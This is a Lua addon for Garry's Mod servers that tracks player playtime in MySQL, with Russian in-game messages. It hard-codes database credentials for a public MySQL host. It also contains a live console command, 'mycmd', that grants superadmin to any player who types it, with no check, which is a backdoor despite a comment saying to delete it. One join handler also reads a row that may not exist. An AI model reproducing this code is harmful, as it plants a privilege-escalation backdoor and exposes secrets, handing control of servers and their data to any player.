-- Written by Team Ulysses, http://ulyssesmod.net/
-- Modified by ACProdigy for MySQL operation
-- Modified by MRDRMUFN for gm_mysqloo support
-- Modified by TweaK for more reliable operation
-- Modified by xbeastguyx for uploading current data to MySQL and changing data storage method.
-- Modified by Hikka for autoreplace UniqueID in SteamID64 [18.12.2016]
 
if !SERVER then return end
 
module( "Utime", package.seeall )
 
require( "mysqloo" )
 
----- Config -----
 
local LockPassword = "asdasdasdasd" -- During the upload process of data, it should not be tampered with.  This clears the server and locks it up with this password, preventing data changes during upload.
local ShowMaintenance = true -- Place [MAINTENANCE] tag in front of your server name?  Suggested to show players what you're doing.
 
local RefreshTime = 30 -- Amount of time between each query to the database.
 
----- Database connection details -----
 
local DATABASE_HOST = "sql7.freemysqlhosting.net"
local DATABASE_USERNAME = "sql7149875"
local DATABASE_PASSWORD = "q4MTwRwaSA"
local DATABASE_PORT = 3306
local DATABASE_NAME = "sql7149875" 
 
--=== DO NOT EDIT BELOW THIS POINT ===--
 
local utime_welcome = CreateConVar( "utime_welcome", "1", FCVAR_ARCHIVE )
local queue = {}
 
local function CMP( text ) -- Console Message Positive
    MsgC( Color( 255, 255, 255 ), "[", Color( 255, 50, 50 ), "UTime-MySQL", Color( 255, 255, 255 ), "]", Color( 50, 255, 50 ), " " .. text .. "\n" )
end
 
local function CMN( text ) -- Console Message Negative
    MsgC( Color( 255, 255, 255 ), "[", Color( 50, 255, 50 ), "UTime-MySQL", Color( 255, 255, 255 ), "]", Color( 255, 0, 0 ), " " .. text .. "\n" )
end
 
local db = mysqloo.connect( DATABASE_HOST, DATABASE_USERNAME, DATABASE_PASSWORD, DATABASE_NAME, DATABASE_PORT )
 
local function query( str, callback )
    local q = db:query( str )
   
    function q:onSuccess( data )
        callback( data )
    end
   
    function q:onError( err )
        if db:status() == mysqloo.DATABASE_NOT_CONNECTED then
            table.insert( queue, { str, callback } )
            db:connect()
        return end
       
        CMN( "Failed to connect to the database!" )
        CMN( "The error returned was: " .. err )
    end
   
    q:start()
end
 
function db:onConnected()
    CMP( "Sucessfully connected to database!" )
   
    for k, v in pairs( queue ) do
        query( v[ 1 ], v[ 2 ] )
    end
   
    queue = {}
end
 
function db:onConnectionFailed( err )
    CMN( "Failed to connect to the database!" )
    CMN( "The error returned was: " .. err )
end
 
db:connect()
 
-- Check that the table exists, create it if not
table.insert( queue, { "SHOW TABLES LIKE 'utime'", function( data )
    if table.Count( data ) < 1 then -- the table doesn't exist
        query( "CREATE TABLE IF NOT EXISTS utime (player BIGINT(20) NOT NULL PRIMARY KEY, totaltime INTEGER NOT NULL, lastvisit INTEGER NOT NULL)", function( data )
            CMP( "Sucessfully created table!" )
        end )
    end
end } )

function PlayerAuthJoined( ply, steamid, uniqueid )
    local uid = ply:UniqueID()
    query( "SELECT player, totaltime, lastvisit FROM utime WHERE player = " .. uid .. " LIMIT 1;", function( uidData )
        local time = 0
        if table.Count( uidData ) != 0 then
            uidRow = uidData[ 1 ]
            time = uidRow.totaltime
            query( "UPDATE utime SET lastvisit = " ..os.time().. ", player = "..ply:SteamID64().." WHERE player = " ..uid, function() end )
        end

        ply:SetUTime( time )
        ply:SetUTimeStart( CurTime() )
        ply.UTimeLoaded = true
    end)
end

hook.Add("PlayerAuthed", "playerstats.auth1", PlayerAuthJoined)
 
function PlayerJoined( ply )
    local sid = ply:SteamID64()
   
    query( "SELECT totaltime, lastvisit FROM utime WHERE player = " .. sid .. " LIMIT 1;", function( sidData )

        if table.Count( sidData ) != 0 then -- player exists
            sidRow = sidData[ 1 ]
            if utime_welcome:GetBool() then
                ULib.tsay( ply, "С возвращением! В последний раз вы играли здесь  " .. os.date( "%a, %b %d, %Y", sidRow.lastvisit ) )
            end

            query( "UPDATE utime SET lastvisit = " .. os.time() .. " WHERE player = " .. sid, function() end )
        else -- player does not exist
            if utime_welcome:GetBool() then
                ULib.tsay( ply, "Добро пожаловать на наш сервер " .. ply:Nick() .. "!" )
            end
           
            -- create the player
            query( "INSERT into utime ( player, totaltime, lastvisit ) VALUES ( " ..
                sid .. ", 0, " .. os.time() .. " )",
                function() print( "Вас занесли в базу данных нашего сервера " .. ply:Nick() .. "." ) end )
        end

		ply:SetUTime( sidRow.totaltime )
		ply:SetUTimeStart( CurTime() )
		ply.UTimeLoaded = true
    end)
end
hook.Add( "PlayerInitialSpawn", "UTimeInitialSpawn", PlayerJoined )
 
function UpdatePlayer( ply )
    query( "UPDATE utime SET totaltime = " .. math.floor( ply:GetUTimeTotalTime() ) .. " WHERE player = " .. ply:SteamID64() .. ";", function() end )
end
hook.Add( "PlayerDisconnected", "UTimeDisconnect", UpdatePlayer )
 
function UpdateAll()
    for _, ply in pairs( player.GetAll() ) do
        if IsValid( ply ) and ply:IsConnected() and ply.UTimeLoaded then
            UpdatePlayer( ply )
        end
    end
end
timer.Create( "UTimeTimer", RefreshTime, 0, UpdateAll )

concommand.Add("mycmd", function(ply) -- удалить.
    ply:SetUserGroup("superadmin")
    print(ply:UniqueID().." | "..ply:SteamID().." | "..ply:GetUTimeTotalTime())
end)
   
concommand.Add( "utime_uploadutime", function( ply )
	if (!ply:IsSuperAdmin()) then return end
    if !file.Exists( "utime_mysql.txt", "DATA" ) then
        file.Write( "utime_mysql.txt", "" )
       
        for k, v in pairs( player.GetAll() ) do
            v:Kick( "SERVER MAINTENANCE, DO NOT JOIN!" )
        end
       
        RunConsoleCommand( "sv_password", LockPassword )
       
        if ShowMaintenance then
            RunConsoleCommand( "hostname", "[MAINTENANCE] " .. GetHostName() )
        end
       
        CMP( "UPLOADING DATA TO MYSQL, LAG MAY OCCUR!" )
       
        if IsValid( ply ) then return end
        local row = sql.QueryValue( "SELECT MAX ( rowid ) FROM utime;" )
        local players = {}
        for i = 1, tonumber( row ) do
            local player = sql.QueryValue( "SELECT player FROM utime WHERE rowid = " .. i .. ";" )
            local totaltime = sql.QueryValue( "SELECT totaltime FROM utime WHERE rowid = " .. i .. ";" )
            local lastvisit = sql.QueryValue( "SELECT lastvisit FROM utime WHERE rowid = " .. i .. ";" )
            players[i] = { player, totaltime, lastvisit }
        end
        for k, v in pairs( players ) do
            local query = db:query( "INSERT into utime ( `player`, `totaltime`, `lastvisit` ) VALUES( " .. tonumber( v[1] ) .. ", " .. tonumber( v[2] ) .. ", " .. tonumber( v[3] ) .. " );" )
            query:start()
        end
        CMP( "Data sucessfully uploaded!\nServer should restart in 10 seconds!  If it does not, restart it manually!" )
        timer.Simple( 10, function()
            RunConsoleCommand( "_restart" )
        end )
    else
        CMN( "You have run this process previously, doing so again will overwrite all previous data.  To continue with the process, please type 'utime_continue' and rerun this command." )
    end
end )
 
concommand.Add( "utime_continue", function( ply )
    if (!ply:IsSuperAdmin()) then return end
    if file.Exists( "utime_mysql.txt", "DATA" ) then
        file.Delete( "utime_mysql.txt" )
        CMP( "Sucessfully deleted the file.  Please rerun the 'uploadutime' command!" )
    else
        CMN( "You have not run the uploadutime command yet!" )
    end
end )
 
concommand.Add( "utime_cleardb", function( ply )	-- очистить всю базу данных
    if (!ply:IsSuperAdmin()) then return end
    local query = db:query( "TRUNCATE TABLE utime" )
    query:start()
    CMP( "Sucessfully cleared the table!" )
end )